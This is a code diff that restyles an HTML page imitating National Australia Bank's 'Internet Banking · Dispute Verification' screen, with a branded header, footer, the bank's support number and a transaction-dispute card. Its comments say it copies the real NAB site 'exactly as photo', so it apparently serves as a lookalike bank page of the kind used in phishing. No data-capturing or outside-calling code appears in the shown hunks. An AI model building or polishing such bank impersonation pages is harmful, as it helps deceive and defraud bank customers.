@@ -3,135 +3,104 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>NAB - Dispute Verification</title>
+  <title>NAB Internet Banking · Dispute Verification</title>
+  <link rel="shortcut icon" href="#" />
+  <!-- Font Awesome (for icons) -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
   <style>
+    /* ----- RESET & BASE ----- */
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
+    }
+
+    body, html {
       font-family: 'Segoe UI', Roboto, Arial, sans-serif;
-    }
-
-    body {
+      height: 100%;
       background: #e8edf2;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
     }
 
-    /* ===== NAB GLOBAL HEADER (full width, top) ===== */
-    .nab-global-header {
-      background: #0a2942;
-      padding: 12px 40px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      border-bottom: 3px solid #f6b81b;
+    /* ----- HEADER (NAB style from first code) ----- */
+    .header_banner {
+      width: 100%;
+      background-color: #0a2942; /* NAB dark navy */
       flex-shrink: 0;
     }
 
-    .nab-global-header .logo-area {
+    .header_inner {
       display: flex;
+      justify-content: space-between;
       align-items: center;
-      gap: 14px;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 14px 24px;
+      width: 100%;
+      gap: 20px;
     }
 
-    .nab-global-header .logo-icon {
-      background: #f6b81b;
-      width: 40px;
-      height: 40px;
-      border-radius: 10px;
+    .header_left {
       display: flex;
       align-items: center;
-      justify-content: center;
-      font-weight: 800;
-      font-size: 18px;
-      color: #0a2942;
+      gap: 12px;
     }
 
-    .nab-global-header .logo-text {
-      color: white;
+    .logo-img {
+      height: 30px;
+      width: auto;
+      filter: brightness(0) invert(1);
+    }
+
+    .header_left h1 {
+      color: #fff;
       font-size: 22px;
-      font-weight: 700;
-      letter-spacing: -0.5px;
-    }
-
-    .nab-global-header .logo-text span {
       font-weight: 300;
-      opacity: 0.7;
-      font-size: 16px;
-      margin-left: 6px;
+      margin: 0;
+      letter-spacing: 0.3px;
     }
 
-    .nab-global-header .nav-links {
-      display: flex;
-      align-items: center;
-      gap: 28px;
+    .header_left h1 span {
+      font-weight: 600;
+    }
+
+    .header_right {
       color: rgba(255, 255, 255, 0.8);
-      font-size: 14px;
-      font-weight: 500;
-    }
-
-    .nab-global-header .nav-links i {
-      margin-right: 6px;
-    }
-
-    .nab-global-header .nav-links .active {
-      color: #f6b81b;
-    }
-
-    .nab-global-header .user-area {
       display: flex;
       align-items: center;
       gap: 18px;
-      color: white;
+      font-size: 14px;
     }
 
-    .nab-global-header .user-area i {
-      font-size: 18px;
-      opacity: 0.8;
-      cursor: pointer;
+    .header_right p {
+      margin: 0;
+      cursor: default;
     }
 
-    .nab-global-header .user-area i:hover {
-      opacity: 1;
+    .header_right .sep {
+      opacity: 0.3;
     }
 
-    .nab-global-header .user-badge {
-      background: rgba(255, 255, 255, 0.12);
-      padding: 6px 16px;
-      border-radius: 40px;
-      font-size: 13px;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-
-    .nab-global-header .user-badge i {
-      font-size: 16px;
-    }
-
-    /* ===== PAGE LAYOUT: header + middle content + footer ===== */
-    .page-wrapper {
-      flex: 1;
+    /* ----- BANNER / PAGE WRAPPER (background) ----- */
+    .banner {
+      position: relative;
+      min-height: 80vh;
+      background: #e8edf2; /* soft grey-blue NAB background */
       display: flex;
       flex-direction: column;
-      padding: 30px 40px 20px 40px;
-      background: #e8edf2;
-      /* This is the NAB background showing through */
+      padding: 30px 20px 20px 20px;
+      flex: 1;
     }
 
-    /* ===== MIDDLE CONTENT SPACE (exactly as photo) ===== */
+    /* ----- MIDDLE CONTENT: dispute card sits here ----- */
     .middle-content {
       flex: 1;
       display: flex;
       justify-content: center;
       align-items: center;
-      /* This is where the dispute card sits in the middle */
+      padding: 10px 0;
     }
 
-    /* ===== DISPUTE CARD (the form in the middle) ===== */
+    /* ----- DISPUTE CARD (exactly as photo) ----- */
     .dispute-card {
       max-width: 520px;
       width: 100%;
@@ -141,7 +110,6 @@
       overflow: hidden;
     }
 
-    /* card header - dispute title */
     .dispute-card-header {
       padding: 22px 28px 16px 28px;
       border-bottom: 1px solid #eef2f6;
@@ -168,7 +136,6 @@
       padding-left: 32px;
     }
 
-    /* card body - form fields */
     .dispute-card-body {
       padding: 20px 28px 24px 28px;
     }
@@ -224,7 +191,6 @@
       padding-left: 4px;
     }
 
-    /* checkbox */
     .confirm-row {
       margin: 22px 0 20px 0;
       background: #f2f7fd;
@@ -265,7 +231,6 @@
       margin-right: 6px;
     }
 
-    /* buttons */
     .button-row {
       display: flex;
       gap: 12px;
@@ -312,19 +277,21 @@
       color: #f6b81b;
     }
 
-    /* ===== NAB GLOBAL FOOTER (full width, bottom) ===== */
-    .nab-global-footer {
+    /* ----- FOOTER (NAB style from first code) ----- */
+    .nab-footer {
       background: #0a2942;
-      padding: 16px 40px;
+      padding: 14px 24px;
       display: flex;
       justify-content: space-between;
       align-items: center;
       flex-shrink: 0;
       border-top: 2px solid #f6b81b;
       margin-top: auto;
+      flex-wrap: wrap;
+      gap: 8px;
     }
 
-    .nab-global-footer .footer-left {
+    .nab-footer .footer-left {
       display: flex;
       align-items: center;
       gap: 20px;
@@ -332,12 +299,12 @@
       font-size: 13px;
     }
 
-    .nab-global-footer .footer-left i {
+    .nab-footer .footer-left i {
       color: #f6b81b;
       margin-right: 4px;
     }
 
-    .nab-global-footer .footer-left .badge {
+    .nab-footer .footer-left .badge {
       background: #f6b81b;
       color: #0a2942;
       font-size: 10px;
@@ -347,37 +314,40 @@
       letter-spacing: 0.5px;
     }
 
-    .nab-global-footer .footer-right {
+    .nab-footer .footer-right {
       display: flex;
       gap: 24px;
       color: rgba(255, 255, 255, 0.6);
       font-size: 13px;
     }
 
-    .nab-global-footer .footer-right i {
+    .nab-footer .footer-right i {
       margin-right: 4px;
     }
 
-    .nab-global-footer .footer-right span {
+    .nab-footer .footer-right span {
       cursor: pointer;
     }
 
-    .nab-global-footer .footer-right span:hover {
+    .nab-footer .footer-right span:hover {
       color: white;
     }
 
-    /* ===== RESPONSIVE ===== */
+    /* ----- RESPONSIVE ----- */
     @media (max-width: 768px) {
-      .nab-global-header {
-        padding: 10px 20px;
+      .header_inner {
         flex-wrap: wrap;
-        gap: 8px;
+        padding: 12px 16px;
       }
-      .nab-global-header .nav-links {
+      .header_right {
         display: none;
       }
-      .page-wrapper {
-        padding: 16px 16px 12px 16px;
+      .header_left h1 {
+        font-size: 18px;
+      }
+      .banner {
+        padding: 16px 12px 12px 12px;
+        min-height: 70vh;
       }
       .dispute-card {
         max-width: 100%;
@@ -387,13 +357,12 @@
         padding-left: 18px;
         padding-right: 18px;
       }
-      .nab-global-footer {
-        padding: 12px 20px;
+      .nab-footer {
         flex-direction: column;
-        gap: 6px;
         text-align: center;
+        padding: 12px 16px;
       }
-      .nab-global-footer .footer-right {
+      .nab-footer .footer-right {
         gap: 14px;
         flex-wrap: wrap;
         justify-content: center;
@@ -401,12 +370,11 @@
     }
 
     @media (max-width: 480px) {
-      .nab-global-header .logo-text {
-        font-size: 17px;
+      .header_left h1 {
+        font-size: 15px;
       }
-      .nab-global-header .user-badge {
-        padding: 4px 12px;
-        font-size: 12px;
+      .logo-img {
+        height: 24px;
       }
       .field-row .field-display {
         font-size: 14px;
@@ -416,41 +384,48 @@
         font-size: 14px;
         padding: 12px 10px;
       }
+      .dispute-card-header h2 {
+        font-size: 17px;
+      }
     }
   </style>
 </head>
 <body>
 
-  <!-- ===== NAB GLOBAL HEADER (full width, like the actual NAB site) ===== -->
-  <header class="nab-global-header">
-    <div class="logo-area">
-      <div class="logo-icon">NAB</div>
-      <div class="logo-text">NAB <span>online banking</span></div>
-    </div>
-    <div class="nav-links">
-      <span><i class="fas fa-home"></i> Home</span>
-      <span class="active"><i class="fas fa-file-invoice"></i> Disputes</span>
-      <span><i class="fas fa-chart-line"></i> Accounts</span>
-      <span><i class="fas fa-exchange-alt"></i> Transfers</span>
-    </div>
-    <div class="user-area">
-      <i class="fas fa-bell"></i>
-      <div class="user-badge">
-        <i class="fas fa-user-circle"></i> John S.
+  <!-- ===== NAB HEADER (from first code) ===== -->
+  <div class="header_banner">
+    <div class="header_inner">
+      <div class="header_left">
+        <!-- using star-big.svg fallback – inline SVG as placeholder -->
+        <svg class="logo-img" viewBox="0 0 90 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect x="2" y="2" width="26" height="26" rx="4" fill="#f6b81b" />
+          <path d="M15 6L17.5 13L25 13L19 17.5L21.5 24.5L15 20L8.5 24.5L11 17.5L5 13L12.5 13L15 6Z" fill="#0a2942" />
+          <text x="34" y="22" font-family="Arial, sans-serif" font-weight="700" font-size="18" fill="white">NAB</text>
+          <text x="68" y="22" font-family="Arial, sans-serif" font-weight="300" font-size="13" fill="rgba(255,255,255,0.7)">online</text>
+        </svg>
+        <h1>Internet Banking</h1>
       </div>
-      <i class="fas fa-sign-out-alt"></i>
+      <div class="header_right">
+        <p id="currentDate"></p>
+        <span class="sep">|</span>
+        <p>Help</p>
+        <span class="sep">|</span>
+        <p>Security</p>
+        <span class="sep">|</span>
+        <p>Contact us</p>
+        <span class="sep">|</span>
+        <p>Locate us</p>
+      </div>
     </div>
-  </header>
+  </div>
 
-  <!-- ===== PAGE WRAPPER (background shows through) ===== -->
-  <div class="page-wrapper">
+  <!-- ===== BANNER / PAGE WRAPPER (background shows through) ===== -->
+  <div class="banner">
 
-    <!-- ===== MIDDLE CONTENT SPACE (card sits here, in the middle) ===== -->
+    <!-- ===== MIDDLE CONTENT: dispute card sits exactly in the middle ===== -->
     <div class="middle-content">
 
-      <!-- Dispute Verification Card -->
       <div class="dispute-card">
-
         <!-- Card Header -->
         <div class="dispute-card-header">
           <h2><i class="fas fa-shield-alt"></i> Dispute Verification</h2>
@@ -459,7 +434,6 @@
 
         <!-- Card Body -->
         <div class="dispute-card-body">
-
           <!-- Transaction Date -->
           <div class="field-row">
             <label><i class="far fa-calendar-alt"></i> Transaction Date</label>
@@ -509,7 +483,6 @@
             <button class="btn-back"><i class="fas fa-arrow-left"></i> Back</button>
             <button class="btn-continue"><i class="fas fa-lock"></i> Continue</button>
           </div>
-
         </div>
         <!-- /card-body -->
       </div>
@@ -519,10 +492,10 @@
     <!-- /middle-content -->
 
   </div>
-  <!-- /page-wrapper -->
+  <!-- /banner -->
 
-  <!-- ===== NAB GLOBAL FOOTER (full width, bottom) ===== -->
-  <footer class="nab-global-footer">
+  <!-- ===== NAB FOOTER (from first code) ===== -->
+  <footer class="nab-footer">
     <div class="footer-left">
       <span><i class="fas fa-phone-alt"></i> 13 22 65</span>
       <span class="badge">24/7 support</span>
@@ -536,5 +509,16 @@
     </div>
   </footer>
 
+  <!-- ===== DATE SCRIPT (from first code) ===== -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      const dateEl = document.getElementById("currentDate");
+      if (dateEl) {
+        const options = { weekday: "long", day: "numeric", month: "long", year: "numeric" };
+        const today = new Date();
+        dateEl.textContent = today.toLocaleDateString("en-GB", options);
+      }
+    });
+  </script>
 </body>
 </html>
